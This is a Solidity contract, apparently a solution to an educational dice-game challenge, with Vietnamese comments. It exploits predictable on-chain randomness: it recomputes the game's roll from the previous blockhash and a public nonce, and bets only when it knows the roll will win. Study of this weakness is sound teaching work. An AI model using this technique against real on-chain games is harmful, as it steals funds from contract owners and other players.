pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    /// @notice rút ETH từ RiggedRoll về 1 địa chỉ
    function withdraw(address payable to) external onlyOwner {
        require(to != address(0), "invalid to");
        uint256 bal = address(this).balance;
        require(bal > 0, "no ETH");
        (bool ok, ) = to.call{value: bal}("");
        require(ok, "transfer failed");
    }

    /// @notice chỉ roll khi dự đoán chắc chắn thắng
    /// IMPORTANT: công thức roll ở dưới PHẢI giống y hệt DiceGame.sol
    function riggedRoll() external onlyOwner {
        // DiceGame thường yêu cầu msg.value == 0.002 ether
        uint256 bet = 0.002 ether;
        require(address(this).balance >= bet, "RiggedRoll needs ETH");

        // ====== SỬA PHẦN NÀY THEO DiceGame.sol ======
        // Bạn mở DiceGame.sol tìm đoạn nó tính "roll" trong rollTheDice()
        // Ví dụ mẫu hay gặp:
        // uint256 roll = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), nonce))) % 16;
        //
        // Nếu DiceGame dùng nonce public: diceGame.nonce()
        // Nếu DiceGame dùng address(this) / msg.sender / block.timestamp... thì phải đưa đúng y chang.
        uint256 predictedRoll =
            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), diceGame.nonce()))) % 16;
        // ============================================

        // Điều kiện thắng trong đề challenge dice thường là roll == 0
        if (predictedRoll == 0) {
            diceGame.rollTheDice{value: bet}();
        } else {
            revert("Not a winning roll, skip");
        }
    }

    /// @notice cho phép contract nhận ETH
    receive() external payable {}
}
